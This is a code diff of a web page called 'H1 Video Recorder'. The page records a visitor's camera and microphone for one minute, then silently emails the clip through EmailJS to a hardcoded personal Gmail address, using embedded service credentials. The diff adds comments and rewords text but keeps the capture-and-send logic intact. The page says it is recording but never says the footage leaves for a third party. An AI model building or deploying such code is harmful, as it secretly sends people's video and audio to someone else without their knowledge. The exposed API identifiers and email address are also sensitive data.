@@ -2,35 +2,40 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Video Recorder</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>H1 Video Recorder</title>
 </head>
 <body>
   <h1>Recording a 1-minute video...</h1>
-  <p>If asked, please allow camera and microphone access.</p>
+  <p>Please allow camera and microphone access if prompted.</p>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("fPzimjK_bZTooKIs_"); // Your EmailJS User ID
+    // Initialize EmailJS with your User ID
+    emailjs.init("fPzimjK_bZTooKIs_"); 
 
     async function startRecording() {
       try {
+        // Request camera and microphone access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
         const recorder = new MediaRecorder(stream);
         const chunks = [];
 
         recorder.ondataavailable = e => chunks.push(e.data);
 
-        recorder.onstop = async () => {
+        recorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
           const reader = new FileReader();
 
           reader.onloadend = function() {
-            const base64data = reader.result.split(',')[1]; // Remove the data:video/webm;base64, part
+            // Convert blob to base64 string (remove prefix)
+            const base64data = reader.result.split(',')[1];
 
+            // Send email with attachment
             emailjs.send("service_p3yitzn", "template_oyrsayr", {
               to_email: "julianlee252@gmail.com",
-              message: "Attached video from your website."
+              message: "Here’s your 1-minute video recording."
             }, {
               attachments: [{
                 name: "recording.webm",
@@ -48,8 +53,11 @@
         };
 
         recorder.start();
+
+        // Stop recording after 60 seconds
         setTimeout(() => {
           recorder.stop();
+          // Stop all media tracks to release camera & mic
           stream.getTracks().forEach(track => track.stop());
         }, 60000);
       } catch (err) {
